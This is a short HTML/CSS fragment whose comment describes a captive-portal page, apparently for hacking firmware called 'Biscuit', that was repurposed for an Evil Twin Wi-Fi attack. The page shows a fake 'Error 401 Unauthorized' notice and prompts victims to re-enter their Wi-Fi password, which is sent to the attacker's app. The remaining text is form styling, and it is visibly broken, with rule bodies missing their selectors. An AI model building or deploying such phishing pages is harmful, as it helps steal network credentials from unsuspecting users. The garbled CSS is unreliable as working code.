<!-- This HTML is for use on Biscuit firmware. -->
<!-- This is a recycled HTML from the Biscuit Manager app called "Spectrum.html" I modified for use as an Evil Twin attack.
     I removed the Spectrum logo and replaced it with "Error 401" as an SVG, below that, the text was replaced with "Unauthorized" and
     below that, the text is replaced with "Verify Wi-Fi password to resume internet connection". Additionally, to get rid of the
     email input field, email is set to always be "N/A" so that only the Wi-Fi password is prompted to the user. Placeholder is
     replaced as "Wi-Fi Password". When user clicks the "Connect" button, the page refreshes for the user and the app receives the
     input password. -->

      }

        margin: 0;
        font-size: 0.8em;
        color: #666;
      }

        display: flex;
        flex-direction: column;
      }
      .container form input {
        margin: 5px 0;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 3px;
      }
      .container form button {
        margin: 5px 0;
        padding: 10px;
        color: #fff;
        background-color: #0076bc;
        border: none;
        border-radius: 3px;
        cursor: pointer;
      }
      .container form button:hover {
        background-color: #005999;
      }
      @media (max-width: 600px) {
        .container {
          width: 95%;
        }
      }
